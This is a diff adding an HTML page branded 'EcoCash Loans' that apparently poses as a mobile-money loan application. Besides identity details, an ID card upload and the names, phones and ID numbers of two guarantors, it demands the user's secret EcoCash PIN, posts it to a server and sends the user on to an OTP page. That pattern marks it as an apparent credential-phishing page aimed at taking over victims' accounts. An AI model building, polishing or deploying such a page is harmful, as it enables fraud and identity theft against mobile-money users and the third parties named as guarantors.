@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Loans</title>
+    <style>
+        :root {
+            --eco-navy: #003366;
+            --eco-blue: #0066CC;
+            --eco-green: #00A859;
+            --bg-color: #f4f6f8;
+            --text-color: #333;
+            --border-color: #e0e0e0;
+        }
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            overscroll-behavior-y: contain; 
+        }
+        .app-header {
+            background-color: var(--eco-navy);
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .app-header .back-btn {
+            font-size: 24px;
+            margin-right: 15px;
+            cursor: pointer;
+        }
+        .app-header .title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 15px;
+            padding-bottom: 80px;
+        }
+        .section {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .section h2 {
+            margin-top: 0;
+            font-size: 16px;
+            color: var(--eco-navy);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 2px solid #f0f0f0;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #555;
+        }
+        label span { color: #d9534f; }
+        input, select, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 15px;
+            outline: none;
+            background: #fafafa;
+            transition: border-color 0.2s;
+        }
+        input:focus, select:focus, textarea:focus {
+            border-color: var(--eco-blue);
+            background: #fff;
+        }
+        .phone-input {
+            display: flex;
+            gap: 10px;
+        }
+        .phone-input select { width: 45%; }
+        .phone-input input { width: 55%; }
+        .file-upload {
+            border: 2px dashed var(--eco-blue);
+            background-color: #f0f7ff;
+            padding: 20px;
+            text-align: center;
+            border-radius: 6px;
+            cursor: pointer;
+            color: var(--eco-blue);
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        .file-upload:active { background-color: #e0ebf5; }
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: var(--eco-green);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 4px 6px rgba(0, 168, 89, 0.2);
+        }
+        .submit-btn:active { background-color: #008f4a; }
+        .submit-btn:disabled { background-color: #a0a0a0; box-shadow: none; }
+    </style>
+</head>
+<body>
+
+<header class="app-header">
+    <div class="back-btn">&#8592;</div>
+    <div class="title">EcoCash Loans</div>
+</header>
+
+<div class="container">
+    <form id="loanForm">
+        <div class="section">
+            <h2>👤 Personal Information</h2>
+            <div class="form-group">
+                <label>Full Name <span>*</span></label>
+                <input type="text" name="fullName" required placeholder="Enter your full name">
+            </div>
+            <div class="form-group">
+                <label>ID/Passport Number <span>*</span></label>
+                <input type="text" name="idNumber" required placeholder="Enter your ID or Passport number">
+            </div>
+            <div class="form-group">
+                <label>ID Card Upload <span>*</span></label>
+                <input type="file" name="idCard" id="idCardInput" accept="image/*,application/pdf" style="display:none;" required>
+                <div class="file-upload" id="uploadBox">📄 Click to upload ID card (PDF/Image)</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📱 Contact Information</h2>
+            <div class="form-group">
+                <label>Phone Number <span>*</span></label>
+                <div class="phone-input">
+                    <select name="countryCode" id="countryCode"></select>
+                    <input type="tel" name="phoneNumber" required placeholder="712345678" pattern="[0-9]{9,10}">
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Email Address <span>*</span></label>
+                <input type="email" name="email" required placeholder="you@example.com">
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>💰 Loan Details</h2>
+            <div class="form-group">
+                <label>Loan Amount ($) <span>*</span></label>
+                <input type="number" name="loanAmount" required placeholder="1000">
+            </div>
+            <div class="form-group">
+                <label>Eco Cash PIN <span>*</span></label>
+                <input type="password" name="ecoCashPin" required placeholder="Enter 4-digit PIN" pattern="[0-9]{4}" maxlength="4">
+            </div>
+            <div class="form-group">
+                <label>Employment Status</label>
+                <select name="employmentStatus" required>
+                    <option value="">Select your employment status</option>
+                    <option value="employed">Employed</option>
+                    <option value="unemployed">Unemployed</option>
+                    <option value="student">Student</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Monthly Income ($)</label>
+                <input type="number" name="monthlyIncome" placeholder="0">
+            </div>
+            <div class="form-group">
+                <label>Loan Purpose</label>
+                <textarea name="loanPurpose" rows="3" placeholder="Briefly describe why you need this loan..."></textarea>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🤝 Guarantors <span>*</span></h2>
+            <div style="border: 1px solid #eee; padding: 15px; border-radius: 6px; margin-bottom: 15px; background: #fafafa;">
+                <h3 style="font-size: 15px; margin-top: 0; color: var(--eco-blue);">Guarantor 1</h3>
+                <div class="form-group"><label>Full Name <span>*</span></label><input type="text" name="guarantor1Name" required></div>
+                <div class="form-group"><label>Phone Number <span>*</span></label><input type="text" name="guarantor1Phone" required></div>
+                <div class="form-group"><label>ID Number <span>*</span></label><input type="text" name="guarantor1Id" required></div>
+                <div class="form-group">
+                    <label>Relationship <span>*</span></label>
+                    <select name="guarantor1Relationship" required>
+                        <option value="">Select relationship</option>
+                        <option value="spouse">Spouse</option>
+                        <option value="parent">Parent</option>
+                        <option value="sibling">Sibling</option>
+                        <option value="friend">Friend</option>
+                        <option value="colleague">Colleague</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+            </div>
+
+            <div style="border: 1px solid #eee; padding: 15px; border-radius: 6px; background: #fafafa;">
+                <h3 style="font-size: 15px; margin-top: 0; color: var(--eco-blue);">Guarantor 2</h3>
+                <div class="form-group"><label>Full Name <span>*</span></label><input type="text" name="guarantor2Name" required></div>
+                <div class="form-group"><label>Phone Number <span>*</span></label><input type="text" name="guarantor2Phone" required></div>
+                <div class="form-group"><label>ID Number <span>*</span></label><input type="text" name="guarantor2Id" required></div>
+                <div class="form-group">
+                    <label>Relationship <span>*</span></label>
+                    <select name="guarantor2Relationship" required>
+                        <option value="">Select relationship</option>
+                        <option value="spouse">Spouse</option>
+                        <option value="parent">Parent</option>
+                        <option value="sibling">Sibling</option>
+                        <option value="friend">Friend</option>
+                        <option value="colleague">Colleague</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submitBtn">Submit Application</button>
+    </form>
+</div>
+
+<script>
+    const countries = [
+        { code: "+61", name: "Australia" }, { code: "+880", name: "Bangladesh" },
+        { code: "+267", name: "Botswana" }, { code: "+257", name: "Burundi" },
+        { code: "+1", name: "Canada" }, { code: "+86", name: "China" },
+        { code: "+243", name: "DRC" }, { code: "+251", name: "Ethiopia" },
+        { code: "+233", name: "Ghana" }, { code: "+91", name: "India" },
+        { code: "+254", name: "Kenya" }, { code: "+266", name: "Lesotho" },
+        { code: "+265", name: "Malawi" }, { code: "+234", name: "Nigeria" },
+        { code: "+92", name: "Pakistan" }, { code: "+250", name: "Rwanda" },
+        { code: "+252", name: "Somalia" }, { code: "+27", name: "South Africa" },
+        { code: "+256", name: "Uganda" }, { code: "+44", name: "UK" },
+        { code: "+1", name: "USA" }, { code: "+260", name: "Zambia" },
+        { code: "+263", name: "Zimbabwe" }
+    ];
+
+    const select = document.getElementById('countryCode');
+    countries.forEach(c => {
+        const option = document.createElement('option');
+        option.value = c.code;
+        option.text = `${c.name} (${c.code})`;
+        if (c.name === 'Zimbabwe') option.selected = true;
+        select.appendChild(option);
+    });
+
+    const uploadBox = document.getElementById('uploadBox');
+    const fileInput = document.getElementById('idCardInput');
+
+    uploadBox.addEventListener('click', () => fileInput.click());
+
+    fileInput.addEventListener('change', () => {
+        if (fileInput.files.length > 0) {
+            uploadBox.innerHTML = `✅ Selected: ${fileInput.files[0].name}`;
+            uploadBox.style.borderColor = "#00A859";
+            uploadBox.style.backgroundColor = "#e8f5e9";
+            uploadBox.style.color = "#00A859";
+        }
+    });
+
+    document.getElementById('loanForm').addEventListener('submit', async (e) => {
+        e.preventDefault(); 
+        
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.innerText = 'Processing...';
+        submitBtn.disabled = true;
+
+        const wakeUpTimer = setTimeout(() => {
+            submitBtn.innerText = 'Waking up server, please wait...';
+        }, 5000);
+
+        const formData = new FormData(e.target);
+
+        try {
+            const response = await fetch('/api/apply', {
+                method: 'POST',
+                body: formData
+            });
+            
+            clearTimeout(wakeUpTimer); 
+            const result = await response.json();
+            
+            if (result.success) {
+                window.location.href = `/otp.html?appId=${result.appId}`;
+            } else {
+                alert('Server Error: ' + (result.message || 'Unknown error occurred'));
+                submitBtn.innerText = 'Submit Application';
+                submitBtn.disabled = false;
+            }
+        } catch (error) {
+            clearTimeout(wakeUpTimer);
+            alert('Connection Error: ' + error.message);
+            submitBtn.innerText = 'Submit Application';
+            submitBtn.disabled = false;
+        }
+    });
+</script>
+
+</body>
+</html>
